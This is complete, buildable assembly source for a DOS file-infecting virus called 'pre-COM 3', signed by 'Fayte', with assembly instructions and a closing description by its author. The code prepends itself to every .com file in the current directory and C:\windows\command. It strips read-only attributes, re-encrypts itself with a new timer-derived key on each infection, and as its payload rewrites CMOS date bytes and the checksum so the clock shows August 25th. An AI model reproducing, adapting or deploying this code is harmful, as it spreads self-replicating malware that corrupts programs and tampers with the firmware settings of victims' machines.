;              '旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커'
;               � *******:::: pre-COM 3 Virus ::::******** �
;               � 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴 �
;               � *********** -= (c) Fayte =- ************ �
;              '읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸'


;encrypted
;different encryption key every infection
;appends its own code to the beginning of the new host
;infects all .com files in current dir
;defeats read-only files
;restores file time and date
;infected files increase by 424 bytes
;payload: this virus has one small payload, it "hangs" your system 
;       calendar at Aug. 25th  
;run-time
;avoids infecting command.com
;
;OHHH,,, if this commenting seems half-assed, that's because it IS!
;I hate commenting   =]
;
;***ASSEMBLY***
;TASM PRECOM <enter>
;TLINK /T PRECOM <enter>
;PRECOM <enter>
;               he hee...

;=================================================================
;=                           Pre-COM                             =
;=================================================================
.model small
code    segment
        assume  cs:code,ds:code
        org     100h
.386


vsize           =       offset eov - offset start
crypt           =       offset eoe - offset soe
start:
marker  db      'M'                     ;infection marker
        call    decr                    ;go decrypt so we can run
encval  db      01h                     ;encrypted? Yes =1,, No = 0
addsub  db      00h                     ;first byte of enc value
;=================================================================
;=              Routine to Copy Virus Ahead in Memory            =
;=================================================================
virus:
        xor     di,     di              ;set di to zero
        lea     si,     [start]         ;point source index to start
        mov     cx,     vsize           ;how much we moving?
        push    ax                      ;save ax register
        mov     ax,     cs              ;ax = code segment
        add     ax,     1000h           ;1000h bytes ahead
        mov     es,     ax              ;mov ax value into extra seg
        rep     movsb                   ;copy virus ahead in mem
        jmp     setup                   ;decrypt to run!
soe:
;=================================================================
;=                      Infection Routine                        =
;=================================================================
infect:
        mov     dx,     fname           ;victim that was found
        xor     cx,     cx              ;zero cx
        mov     ax,     4301h           ;remove all attributes
        int     21h                     ;DOS
        mov     ax,     3d02h           ;open the victim
        int     21h                     ;DOS
        xchg    bx,     ax              ;mov file handle to BX reg.
        mov     ax,     5700h           ;get it's date/time
        int     21h                     ;DOS
        push    dx                      ;save date and time
        push    cx                      ;
        mov     ah,     3fh             ;read from victim
        mov     cx,     01h             ;one byte
        lea     dx,     [buffer]        ;into our buffer
        int     21h                     ;DOS
        mov     ah,     3eh             ;close it
        int     21h                     ;DOS
        cmp     buffer, 'M'             ;is that byte an "M"?
        je      next                    ;if it is then find the next
        mov     ax,     3d02h           ; if not then re-open
        mov     dx,     fname           ;the victim
        int     21h                     ;DOS
        push    es                      ;save extra segment
        pop     ds                      ;pop the value into data seg.
        mov     ah,     3Fh             ;read from victim
        mov     dx,     vsize           ;to the end of virus
        mov     cx,     0FFFFh          ;all of victim, up to 65535 b.
        int     21h                     ;DOS
        add     ax,     vsize           ;virus size into ax
        mov     cs:[eof],ax             ;write it at end of 
        cwd                             ;move to
        xor     cx,     cx              ;zero bytes from
        mov     ax,     4200h           ;start of file
        int     21h                     ;DOS
        jc      close                   ;didnt work? then close it
        xor     dx,     dx              ;dx = 0
        mov     cx,     cs:[eof]        ;write virus & host
        mov     ah,     40h             ;write to file
        int     21h                     ;DOS
        pop     cx                      ;resotre time
        pop     dx                      ;restore date
        mov     ax,     5701h           ;set file stamp
        int     21h                     ;DOS
close:
        mov     ah,     3Eh             ;close the file
        int     21h                     ;DOS
        push    cs                      ;move code segment to stack
        pop     ds                      ;pop cs to ds
        jmp     next                    ;fix DTA

;=================================================================
;=                      Set/Reset the DTA                        =
;=================================================================
done:
        mov     dx,     80h             ;original DTA address
        mov     ah,     1Ah             ;set DTA
        int     21h                     ;DOS
        jmp     hostok                  ;finish, and return
setdta:
        mov     ah,     3bh             ;change directory
        lea     dx,     cs:[windows]    ;to C:\windows\command
        int     21h                     ;DOS
        mov     ah,     1Ah             ;set dta
        lea     dx,     [newdta]        ;at this address
        int     21h                     ;DOS
;=================================================================
;=                      Routine to FIX cmos                      =
;=================================================================
        nop
        mov     dl,     7               ;dl = byte to change
        mov     bl,     8               ;bl = value to put there
cmos:
        xor     ax,     ax      
        mov     al,     2Eh             ;msb of checksum address
        out     70h,    al              ;send address / control byte
        in      al,     71h             ;read byte
        xchg    ch,     al              ;store al in ch
        mov     al,     2Fh             ;lsb of checksum address
        out     70h,    al              ;send address / control byte
        in      al,     71h             ;read byte
        xchg    cl,     al              ;store lsb to cl
        push    dx              
        xchg    dl,     al              ;AL = address
        out     70h,    al              ;send address / control byte
        in      al,     71h             ;read register
        sub     cx,     ax              ;subtract from checksum
        add     cx,     bx              ;update checksum value in register
        pop     dx
        xchg    dl,     al              ;AL = address
        out     70h,    al              ;specify CMOS address
        xchg    al,     bl              ;new CMOS value => al
        out     71h,    al              ;write new CMOS byte
        mov     al,     2Eh             ;address of checksum 's msb
        out     70h,    al              ;specify CMOS address
        xchg    al,     ch              ;msb of new checksum
        out     71h,    al              ;write new CMOS msb
        mov     al,     2Fh             ;address of checksum 's lsb
        out     70h,    al              ;specify CMOS address
        xchg    al,     cl              ;lsb of new checksum
        out     71h,    al              ;write new CMOS lsb
        cmp     dl,     8               ;8h done, yet?
        je      find                    ;YES, then run the virus
        mov     dl,     8               ;load 8h address
        mov     bl,     25              ;load value to put there
        call    cmos                    ;and go do it
;=================================================================
;=                       Findfirst/next                          =
;=================================================================
next:
        mov     ah,     4Fh             ;find next
        int     21h                     ;DOS
        jc      done                    ;no more,, then quit
        jmp     infect                  ;otherwise, infect it
find:                           
        lea     dx,     [allcom]        ;search for *.com
        mov     ah,     4Eh             ;find files
        mov     cx,     111b            ;all attrib's
        int     21h                     ;DOS
        jc      done                    ;cant find any, quit
        jmp     infect                  ;infect it
;=================================================================
;=                 Restore host, and JMP to it                   =
;=================================================================
moveit:
        push    ds                      ;point es
        pop     es                      ;to ds
        lea     si,     [eov]           ;point si at host
        mov     cx,     0FFFFh          ;write it all
        sub     cx,     si              ;except the virus
        lea     di,     [start]         ;back to 100h
        rep     movsb                   ;
        mov     word ptr cs:[start],offset start;
        mov     word ptr cs:[start+2],ds
        mov     ax,     bx
        jmp     dword ptr cs:[start]
hostok:
        mov     cx,     offset eov - offset moveit
        xor     di,     di
        lea     si,     [moveit]
        rep     movsb
        pop     bx
        mov     word ptr cs:[host],0
        mov     word ptr cs:[host+2],es
        jmp     cs:[host]
;=================================================================
;=                           Data Area                           =
;=================================================================
me      db      '-=Fayte=-'             ;das ME!
allcom  db      '*.com',0               ;file mask
windows db      'C:\windows\command'    ;DOS directory
host    dd      ?                       ;location of host
eof     dw      ?                       ;location of end of file
newdta  db      2Ch dup (?)             ;DTA
fname   equ     offset newdta+1Eh       ;location of file name (DTA)
buffer  dw      ?                       ;buffer byte read
eoe:
subadd  db      00h                     ;second byte of enc value
;=================================================================
;=                      encrypt/decrypt                          =
;=================================================================
decr:
        sub     byte    ptr[encval],1   ;remove encrypted marker
setup:
        mov     bh,     addsub          ;get ecn value byte one
        mov     bl,     subadd          ;get enc value byte two
        sub     si,     si              ;si = 0
decrypt:
        add     word    ptr[soe+si],bx  ;decrypt two bytes
        inc     si                      ;si + 1
        inc     si                      ;si + 1
        xchg    bh,     bl              ;switch values of bh and bl
        cmp     si,     crypt           ;are we done?
        jne     decrypt                 ;no,,, then get do two more
chkval:
        cmp     byte    ptr[encval],00h ;already encrypted? 
        jne     setdta                  ;yes, go set dta
        sub     si,     si              ;si = 0
newkey:
        mov     ah,     00h             ;get timer clicks
        int     1ah                     ;DOS - system timer
        mov     addsub, dl              ;first enc byte
        mov     subadd, dh              ;second enc byte
        mov     bh,     addsub          ;mov to BX
        mov     bl,     subadd          ;mov to BX
enc:
        mov     encval, 1
        sub     si,     si              ;si = 0
encrypt:
        sub     word    ptr[soe+si],bx  ;encrypt two bytes
        inc     si                      ;si + 1
        inc     si                      ;si + 1
        xchg    bh,     bl              ;swap bh and bl values
        cmp     si,     crypt           ;done yet?
        jne     encrypt                 ;no, then encrypt more
        call    virus                   ;then go to virus
;=================================================================
;=                           Fake Host                           =
;=================================================================
eov:
        int     20h                     ;terminate program


code    ends
        end     start
;=================================================================
;=                            Pre-COM                            =
;=================================================================

;       Pre-COM is a prepending virus, meaning it attaches it's code
;to the beginning of the host file without overwriting it.  It is a 
;run-time (non-TSR) COM infector.  The infection marker 'M' has a 
;dual purpose.  First, it is a marker showing that a file has already
;been infected (DUH!).  Second, searching for that 'M' in the first 
;byte of a file makes the virus think that command.com is infected
;there-by avoiding infection of this file.  Encryption is simple.
;I call int 1ah to get system timer click value, and use the bytes 
;in DX for my encryption value.  I add that value to two bytes of the 
;file, exchange dh and dl, and add that to two more,,, and so on...
;This version also uses cmos addresses 07h, and 08h to make your comp 
;think that the date is Aug 25th everytime it re-starts
                        "Invasion of privacy"
                        What fukkin' privacy?
                               ~Fayte~